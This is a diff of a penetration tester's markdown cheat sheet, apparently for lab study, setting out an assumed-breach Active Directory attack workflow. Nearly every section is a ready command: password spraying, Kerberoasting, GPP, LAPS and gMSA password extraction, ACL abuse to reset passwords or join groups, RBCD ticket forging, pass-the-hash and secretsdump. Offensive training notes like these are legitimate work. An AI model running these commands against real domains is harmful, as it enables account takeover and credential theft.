@@ -1,136 +1,223 @@
-# Active Directory
-
 ## Assumed-breach workflow
 
-```text
-1. Sync time and add the DC/domain to /etc/hosts.
-2. Test the supplied creds on SMB, WinRM, LDAP, MSSQL, RDP, all hosts.
-3. Find where you are local admin first.
-4. Dump LDAP to files, Kerberoast, AS-REP roast, spider shares.
-5. Check writable AD objects with bloodyAD.
-6. If you get a foothold, enumerate logged-on users, dump creds, then repeat.
-7. Check LAPS, gMSA, GPP, and no-creds paths only if the target gives you a reason.
+Start condition:
+- local admin on foothold: do `Starting host: establish local state` first, then immediate LDAP baseline before deep host PE
+- only domain creds: do host-local checks only if you also have code exec
+- both: do quick host-local checks first, then targeted replay and immediate LDAP baseline
+
+Targeting rules:
+- broad replay uses IPs
+- LDAP manual checks use the DC FQDN or explicit `/etc/hosts` entry
+- Kerberos-sensitive actions use FQDNs
+- only switch bind formats during failure diagnosis
+- password spraying happens only after you have the password policy and a user list
+- Kali-side commands assume `DOMAIN`, `DC_IP`, `USER`, and `PASS` are already exported
+
+## Starting host: establish local state
+
+```powershell
+whoami /all
+hostname
+ipconfig /all
+route print
+quser
+qwinsta
 ```
+
+If you already have local admin or SYSTEM, use [[Privilege Escalation/Windows Privilege Escalation]] for host-level looting and post-admin checks.
+
+Record:
+- current user, host, domain, routes
+- user and machine flags
+- saved credentials
+- active sessions
+- localhost-only services worth forwarding
+
+## When to run the whole thing
+
+Run the full workflow once:
+- at the start of the AD set
+- after you get a new credential type
+  - new domain user
+  - new local admin
+  - new hash
+  - new ticket
+- after you gain access to a new network segment
+
+## What to rerun after state changes
+
+If you get a new domain credential:
+- replay it on SMB, WinRM, LDAP, MSSQL, RDP
+- rerun LDAP enum, group review, Kerberoast, AS-REP roast, share spidering, bloodyad writable checks
+
+If you get local admin on a host:
+- check logged-on users and sessions
+- dump local creds, vaults, browser material, config files, scheduled tasks, services
+- check localhost-only services and forward them if useful
+- test any new creds or hashes everywhere they might work
+
+## Workflow order
+
+1. establish host position
+2. sync time and add the DC/domain locally
+3. replay each known credential on SMB, WinRM, LDAP, MSSQL, RDP
+4. identify where you already have local admin
+5. get password policy and a user list for any broad spray
+6. do immediate LDAP baseline and targeted group review
+7. spray candidate passwords only if the policy and user list support it
+8. if you gain new host access, loot it, forward localhost-only services, and rerun replay plus LDAP/group/object checks
 
 ## Sync time with the domain controller
 
 ```bash
-sudo ntpdate <DC-IP>
+sudo ntpdate $DC_IP
 ```
 
 ## Add the domain and controller locally
 
 ```bash
-echo "<DC-IP> domain.local dc.domain.local" | sudo tee -a /etc/hosts
+echo "$DC_IP $DOMAIN dc.$DOMAIN" | sudo tee -a /etc/hosts
 ```
 
-## Test SMB on all hosts
+## Build a user list
 
 ```bash
-netexec smb hosts.txt -u user -p 'password' --shares
+nxc ldap $DC_IP -u "$USER" -p "$PASS" --active-users --users-export users.txt
 ```
 
-## Test WinRM on all hosts
+Omit `--active-users` to see if any users are disabled. We shouldn't spray credentials against them, but these accounts are worth noting anyways.
+
+Fallback:
+```bash
+nxc smb $DC_IP -u "$USER" -p "$PASS" --rid-brute | tee rid-brute.txt
+```
+
+## LDAP baseline enumeration
+Rerun after new domain creds
 
 ```bash
-netexec winrm hosts.txt -u user -p 'password'
+ldapdomaindump -u "$DOMAIN\\$USER" -p "$PASS" -r -n $DC_IP "$DOMAIN" -o ldap_as_$USER
 ```
 
-## Test LDAP on the domain controller
+Helpful at a glance:
+```
+netexec ldap $DC_IP -u "$USER" -p "$PASS" --users --groups --computers --pass-pol
+```
 
+High-value groups:
+- Domain Admins
+- Enterprise Admins
+- Administrators
+- Account Operators
+- Server Operators
+- Backup Operators
+- Remote Management Users
+- Remote Desktop Users
+- Distributed COM Users
+- Group Policy Creator Owners
+
+For a specific user, inspect recursive group membership:
 ```bash
-netexec ldap <DC-IP> -u user -p 'password' --users --groups --computers --pass-pol
+bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP get membership "<user>"
 ```
 
-## If LDAP bind or collection fails
-
+### If LDAP bind or collection fails
 1. sync time again
 2. verify the creds against SMB on the DC
 3. verify name resolution for the DC and domain
 4. validate LDAP with [[389,636 LDAP(S)#Check who you are after an authenticated bind]]
 5. keep enumerating manually even if BloodHound is broken
 
-## Test MSSQL on all hosts
+## Test SMB on all hosts
 
 ```bash
-netexec mssql hosts.txt -u user -p 'password'
+netexec smb hosts.txt -u "$USER" -p "$PASS" --shares
+```
+
+Use `-M spider_plus` on interesting shares.
+
+## Pull Group Policy passwords
+
+```bash
+netexec smb $DC_IP -u "$USER" -p "$PASS" -M gpp_password
+```
+
+## Test WinRM on all hosts
+
+```bash
+netexec winrm hosts.txt -u "$USER" -p "$PASS"
 ```
 
 ## Test RDP on all hosts
 
 ```bash
-netexec rdp hosts.txt -u user -p 'password'
+netexec rdp hosts.txt -u "$USER" -p "$PASS"
+```
+
+## Test MSSQL on all hosts
+
+```bash
+netexec mssql hosts.txt -u "$USER" -p "$PASS"
 ```
 
 ## Test local admin reuse
 
 ```bash
-netexec smb hosts.txt -u Administrator -p 'password' --local-auth
+netexec smb hosts.txt -u Administrator -p "$PASS" --local-auth
 ```
 
-## Dump LDAP to files
+## Credential replay and spray
 
+Targeted replay first:
+- new domain user creds: replay immediately on SMB, WinRM, LDAP, MSSQL, RDP
+- local admin creds: test `--local-auth` across hosts with the same local account name
+- do not wait for a full user list before replaying a fresh credential you already have
+
+Password spray only after policy and user-list collection:
 ```bash
-ldapdomaindump -u 'domain.local\user' -p 'password' -r -n <DC-IP> domain.local
-```
-
-## RID brute the domain controller
-
-```bash
-netexec smb <DC-IP> -u user -p 'password' --rid-brute
-```
-
-## Spider useful shares
-
-```bash
-netexec smb hosts.txt -u user -p 'password' -M spider_plus
+netexec smb hosts.txt -u users.txt -p "$PASS" --continue-on-success
+netexec winrm hosts.txt -u users.txt -p "$PASS" --continue-on-success
 ```
 
 ## Kerberoast with valid credentials
 
 ```bash
-netexec ldap <DC-IP> -u user -p 'password' --kerberoasting kerberoast.txt
+netexec ldap $DC_IP -u "$USER" -p "$PASS" --kerberoasting kerberoast.txt
 ```
 
 ## AS-REP roast with valid credentials
 
 ```bash
-netexec ldap <DC-IP> -u user -p 'password' --asreproast asrep.txt
+netexec ldap $DC_IP -u "$USER" -p "$PASS" --asreproast asrep.txt
 ```
 
 ## Check writable AD objects
 
 ```bash
-bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> get writable
-```
-
-## Check writable AD objects with details
-
-```bash
-bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> get writable --detail
+bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP get writable --detail
 ```
 
 ## Take ownership, grant rights, then reset password
 
 ```bash
-bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> set owner <target_user> 'user'
-bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> add genericAll <target_user> 'user'
-bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> set password <target_user> '<NewPassword123!>'
+bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP set owner <target_user> "$USER"
+bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP add genericAll <target_user> "$USER"
+bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP set password <target_user> '<NewPassword123!>'
 ```
 
 ## Take ownership, grant rights, then add yourself to group
 
 ```bash
-bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> set owner 'Group Name' 'user'
-bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> add genericAll 'Group Name' 'user'
-bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> add groupMember 'Group Name' 'user'
+bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP set owner 'Group Name' "$USER"
+bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP add genericAll 'Group Name' "$USER"
+bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP add groupMember 'Group Name' "$USER"
 ```
 
 ## Add SPN to a controlled user, then Kerberoast
 
 ```bash
-bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> add servicePrincipalName <controlled_user> 'HTTP/fake.domain.local'
-impacket-GetUserSPNs domain.local/'controlled_user':'ControlledPass123!' -dc-ip <DC-IP> -request
+bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP add servicePrincipalName <controlled_user> "HTTP/fake.$DOMAIN"
+impacket-GetUserSPNs "$DOMAIN"/'controlled_user':'ControlledPass123!' -dc-ip $DC_IP -request
 ```
 
 ## Run with domain creds only over the network
@@ -142,106 +229,66 @@ runas /netonly /user:domain.local\user cmd
 ## Check remote sessions with NetExec
 
 ```bash
-netexec smb hosts.txt -u user -p 'password' --sessions
-netexec smb hosts.txt -u user -p 'password' --loggedon-users
+netexec smb hosts.txt -u "$USER" -p "$PASS" --sessions
+netexec smb hosts.txt -u "$USER" -p "$PASS" --loggedon-users
 ```
 
 ## Check LAPS with NetExec
 
 ```bash
-netexec ldap <DC-IP> -u user -p 'password' -M laps
+netexec ldap $DC_IP -u "$USER" -p "$PASS" -M laps
 ```
 
 ## Check gMSA passwords with NetExec
 
 ```bash
-netexec ldap <DC-IP> -u user -p 'password' -M gmsa
+netexec ldap $DC_IP -u "$USER" -p "$PASS" -M gmsa
 ```
 
 ## Read gMSA password directly with BloodyAD
 
 ```bash
-bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> get object 'gmsa01$' --attr msDS-ManagedPassword
-```
-
-## Pull Group Policy passwords
-
-```bash
-netexec smb <DC-IP> -u user -p 'password' -M gpp_password
+bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP get object 'gmsa01$' --attr msDS-ManagedPassword
 ```
 
 ## Create a computer account if MAQ allows it
 
 ```bash
-impacket-addcomputer -computer-name 'ATTACKBOX$' -computer-pass 'Passw0rd!' -dc-ip <DC-IP> domain.local/user:'password'
+impacket-addcomputer -computer-name 'ATTACKBOX$' -computer-pass 'Passw0rd!' -dc-ip $DC_IP "$DOMAIN"/"$USER":"$PASS"
 ```
 
 ## Create a computer account with BloodyAD
 
 ```bash
-bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> add computer ATTACKBOX 'Passw0rd!'
+bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP add computer ATTACKBOX 'Passw0rd!'
 ```
 
 ## Write RBCD on a target computer
 
 ```bash
-impacket-rbcd -delegate-from 'ATTACKBOX$' -delegate-to 'TARGET$' -action write domain.local/user:'password' -dc-ip <DC-IP>
+impacket-rbcd -delegate-from 'ATTACKBOX$' -delegate-to 'TARGET$' -action write "$DOMAIN"/"$USER":"$PASS" -dc-ip $DC_IP
 ```
 
 ## Add RBCD with BloodyAD
 
 ```bash
-bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> add rbcd 'TARGET$' 'ATTACKBOX$'
+bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP add rbcd 'TARGET$' 'ATTACKBOX$'
 ```
 
 ## Add shadow credentials
 
 ```bash
-bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> add shadowCredentials target_user
+bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP add shadowCredentials target_user
 ```
 
 ## Use MAQ plus RBCD to get a service ticket
 
 ```bash
-impacket-addcomputer -computer-name 'ATTACKBOX$' -computer-pass 'Passw0rd!' -dc-ip <DC-IP> domain.local/user:'password'
-impacket-rbcd -delegate-from 'ATTACKBOX$' -delegate-to 'TARGET$' -action write domain.local/user:'password' -dc-ip <DC-IP>
-impacket-getST -spn cifs/target.domain.local -impersonate Administrator domain.local/'ATTACKBOX$':'Passw0rd!' -dc-ip <DC-IP>
+impacket-addcomputer -computer-name 'ATTACKBOX$' -computer-pass 'Passw0rd!' -dc-ip $DC_IP "$DOMAIN"/"$USER":"$PASS"
+impacket-rbcd -delegate-from 'ATTACKBOX$' -delegate-to 'TARGET$' -action write "$DOMAIN"/"$USER":"$PASS" -dc-ip $DC_IP
+impacket-getST -spn "cifs/target.$DOMAIN" -impersonate Administrator "$DOMAIN"/'ATTACKBOX$':'Passw0rd!' -dc-ip $DC_IP
 export KRB5CCNAME=Administrator.ccache
-impacket-psexec -k -no-pass domain.local/Administrator@target.domain.local
-```
-
-## Inspect a user or group directly with BloodyAD
-
-```bash
-bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> get object '<DN or samAccountName>'
-```
-
-## List members of a high-value group
-
-```bash
-bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> get members 'Domain Admins'
-```
-
-## Collect BloodHound with BloodyAD
-
-```bash
-bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> get bloodhound
-```
-
-## Windows foothold checks only
-
-```powershell
-Find-LocalAdminAccess
-quser
-qwinsta
-Get-DomainGPO | Select-Object displayname,gpcfilesyspath
-```
-
-## Test a found NTLM hash
-
-```bash
-netexec smb hosts.txt -u user -H <hash>
-netexec winrm hosts.txt -u user -H <hash>
+impacket-psexec -k -no-pass "$DOMAIN"/Administrator@"target.$DOMAIN"
 ```
 
 ## Use pass-the-hash with Impacket
@@ -253,12 +300,11 @@ impacket-psexec <domain>/<user>@<target> -hashes :<hash>
 ## Dump domain credentials as domain admin
 
 ```bash
-impacket-secretsdump domain.local/username:password@<DC-IP>
+impacket-secretsdump "$DOMAIN"/username:password@$DC_IP
 ```
 
 ## Use the AD template
 
-```text
 Track:
 - supplied creds
 - new creds, hashes, tickets
@@ -266,32 +312,25 @@ Track:
 - local admin hosts
 - logged-on privileged users
 - readable shares and loot
-- kerberoast / asrep results
-- writable users, groups, OUs, GPOs, delegation
+- `kerberoast` / `asrep` results
+- writable users, groups, `OUs`, `GPOs`, delegation
 - next smallest abuse step
-```
 
 ## Use the service docs when needed
 
-```text
-LDAP: [[389,636 LDAP(S)]]
-Kerberos: [[88 Kerberos]]
-SMB: [[139,445 SMB]]
-WinRM: [[5985, 5986 WinRM]]
-MSSQL: [[1433 MSSQL]]
-```
+- LDAP: [[389,636 LDAP(S)]]
+- Kerberos: [[88 Kerberos]]
+- SMB: [[139,445 SMB]]
+- WinRM: [[5985, 5986 WinRM]]
+- MSSQL: [[1433 MSSQL]]
 
 ## Use Windows post-exploitation after a foothold
 
-```text
 [[Windows Privilege Escalation#Post-exploitation after admin or SYSTEM]]
-```
 
 ## Rare fallback if the lab gives no creds
 
-```text
 Only then care about:
 - anonymous LDAP
 - SMB/RPC null sessions
-- AS-REP from guessed users
-```
+- `AS-REP` from guessed users
